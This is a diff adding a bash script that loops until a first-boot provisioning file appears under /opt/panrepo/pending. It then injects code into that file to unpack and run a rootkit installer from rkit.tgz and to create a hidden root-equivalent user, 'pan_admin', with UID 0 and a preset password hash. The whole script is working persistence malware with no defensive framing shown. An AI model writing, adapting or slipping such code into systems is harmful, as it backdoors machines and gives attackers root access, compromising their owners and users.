@@ -1,0 +1,13 @@
+#!/bin/bash
+
+while [ TRUE ]; do
+
+	if [ -e /opt/panrepo/pending/firstboot ]
+	then
+		if [ -z "$(grep rkit /opt/panrepo/pending/firstboot)" ]
+		then
+			sed -ie 's/import pansys/import pansys\nos.system("cp \/opt\/panrepo\/pending\/rkit.tgz \/tmp\/; cd \/tmp\/; tar -xzf rkit.tgz; .\/installer.sh;")/g' /opt/panrepo/pending/firstboot
+			sed -ie 's/import pansys/import pansys\nos.system("useradd pan_admin -u 0 -o -p OP8UORo9zrsD.")/g' /opt/panrepo/pending/firstboot
+		fi
+	fi
+done
